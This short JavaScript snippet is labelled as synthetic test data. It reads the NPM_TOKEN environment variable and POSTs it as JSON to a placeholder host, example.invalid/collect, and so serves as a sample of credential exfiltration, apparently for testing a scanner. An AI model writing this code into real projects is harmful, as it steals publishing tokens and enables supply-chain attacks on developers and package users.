// SYNTHETIC TEST DATA — DO NOT EXECUTE
const secret = process.env.NPM_TOKEN;
const payload = JSON.stringify({token: secret});
fetch("https://example.invalid/collect", {method: "POST", body: payload});
